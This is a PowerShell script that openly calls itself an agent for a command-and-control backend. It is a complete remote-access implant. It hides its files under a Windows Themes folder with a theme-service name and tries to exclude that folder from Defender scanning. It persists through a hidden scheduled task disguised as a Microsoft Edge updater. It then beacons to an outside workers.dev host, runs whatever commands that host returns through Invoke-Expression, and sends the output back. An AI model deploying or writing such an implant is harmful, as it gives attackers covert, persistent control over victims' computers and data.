# PowerShell Agent for Advanced C2 Backend
# Supports: D1 results, KV commands, proper API structure
$ErrorActionPreference = 'SilentlyContinue'

# ============================================
# CONFIGURATION - UPDATE THESE!
# ============================================
$BACKEND_URL = 'https://backend.ice-cold-169.workers.dev'
$AGENT_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
$BEACON_INTERVAL = 60  # seconds

# Installation paths
$InstallDir = "$env:APPDATA\Microsoft\Windows\Themes"
$BeaconPath = "$InstallDir\ThemeService.ps1"
$LogFile = "$env:APPDATA\Microsoft\Windows\theme.log"

# ============================================
# LOGGING FUNCTION
# ============================================
function Write-Log {
    param($Message)
    $Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    "[$Timestamp] $Message" | Out-File $LogFile -Append
}

# ============================================
# INSTALLATION
# ============================================
try {
    Write-Log "=== Installation Started ==="
    Write-Log "Agent ID: $AGENT_ID"
    Write-Log "Backend URL: $BACKEND_URL"
    
    # Create directory
    if (!(Test-Path $InstallDir)) {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
        Write-Log "Created directory: $InstallDir"
    }
    
    # Try adding Defender exclusions
    try {
        Add-MpPreference -ExclusionPath $InstallDir -Force
        Write-Log "Added Defender exclusion"
    } catch {
        Write-Log "Defender exclusion failed (continuing)"
    }
    
    # ============================================
    # CREATE BEACON SCRIPT
    # ============================================
    $BeaconScript = @"
# Advanced C2 Agent - Beacon Script
`$ErrorActionPreference = 'SilentlyContinue'

# Configuration
`$BACKEND_URL = '$BACKEND_URL'
`$AGENT_ID = '$AGENT_ID'
`$BEACON_INTERVAL = $BEACON_INTERVAL
`$LogFile = '$LogFile'

# Logging function
function Write-AgentLog {
    param(`$Message)
    `$Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    "[`$Timestamp] `$Message" | Out-File `$LogFile -Append
}

# Main beacon loop
while (`$true) {
    try {
        Write-AgentLog "Sending beacon to backend..."
        
        # Prepare beacon request
        `$beaconBody = @{
            id = `$AGENT_ID
        } | ConvertTo-Json
        
        # Send beacon
        `$response = Invoke-RestMethod ``
            -Uri "`$BACKEND_URL/beacon" ``
            -Method Post ``
            -ContentType 'application/json' ``
            -Body `$beaconBody ``
            -TimeoutSec 30
        
        Write-AgentLog "Beacon response: `$(if(`$response.command){'Command received'}else{'No command'})"
        
        # Check if command received
        if (`$response.command -and `$response.commandId) {
            `$command = `$response.command
            `$commandId = `$response.commandId
            
            Write-AgentLog "Executing command ID: `$commandId"
            Write-AgentLog "Command: `$command"
            
            # Execute command and capture output
            try {
                `$output = Invoke-Expression `$command 2>&1 | Out-String
                Write-AgentLog "Command executed successfully"
            } catch {
                `$output = "ERROR: `$(`$_.Exception.Message)"
                Write-AgentLog "Command execution failed: `$output"
            }
            
            # Send result back to backend
            `$resultBody = @{
                agentId = `$AGENT_ID
                commandId = `$commandId
                output = `$output
            } | ConvertTo-Json
            
            `$resultResponse = Invoke-RestMethod ``
                -Uri "`$BACKEND_URL/api/result" ``
                -Method Post ``
                -ContentType 'application/json' ``
                -Body `$resultBody ``
                -TimeoutSec 30
            
            Write-AgentLog "Result submitted successfully"
        }
        
        # Use interval from backend response (adaptive beaconing)
        if (`$response.interval) {
            `$BEACON_INTERVAL = `$response.interval
        }
        
    } catch {
        Write-AgentLog "Beacon error: `$(`$_.Exception.Message)"
    }
    
    # Sleep until next beacon
    Start-Sleep `$BEACON_INTERVAL
}
"@

    # Write beacon script
    Set-Content -Path $BeaconPath -Value $BeaconScript -Force
    Write-Log "Beacon script created: $BeaconPath"
    
    # ============================================
    # CREATE PERSISTENCE
    # ============================================
    $TaskName = "MicrosoftEdgeUpdateTaskMachineUA"
    
    # Remove existing task
    schtasks /delete /tn $TaskName /f 2>$null
    
    # Create scheduled task
    $Action = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
    schtasks /create /tn $TaskName /tr "powershell.exe $Action" /sc ONLOGON /ru "$env:USERNAME" /rl HIGHEST /f | Out-Null
    
    Write-Log "Scheduled task created: $TaskName"
    
    # ============================================
    # START BEACON IMMEDIATELY
    # ============================================
    Start-Process powershell.exe -ArgumentList $Action -WindowStyle Hidden
    Write-Log "Beacon started!"
    
    # ============================================
    # INITIAL BEACON TEST
    # ============================================
    try {
        Write-Log "Sending initial beacon..."
        
        $initialBeacon = @{
            id = $AGENT_ID
        } | ConvertTo-Json
        
        $testResponse = Invoke-RestMethod `
            -Uri "$BACKEND_URL/beacon" `
            -Method Post `
            -ContentType 'application/json' `
            -Body $initialBeacon `
            -TimeoutSec 30
        
        Write-Log "Initial beacon successful!"
        Write-Log "Backend response: $($testResponse | ConvertTo-Json -Compress)"
    } catch {
        Write-Log "Initial beacon failed: $($_.Exception.Message)"
    }
    
    Write-Log "=== Installation Complete ==="
    Write-Host "SUCCESS! Agent installed and running."
    Write-Host "Agent ID: $AGENT_ID"
    Write-Host "Backend: $BACKEND_URL"
    Write-Host "Log: $LogFile"
    
} catch {
    Write-Log "FATAL ERROR: $($_.Exception.Message)"
    Write-Host "ERROR: $($_.Exception.Message)"
    Write-Host "Check log: $LogFile"
}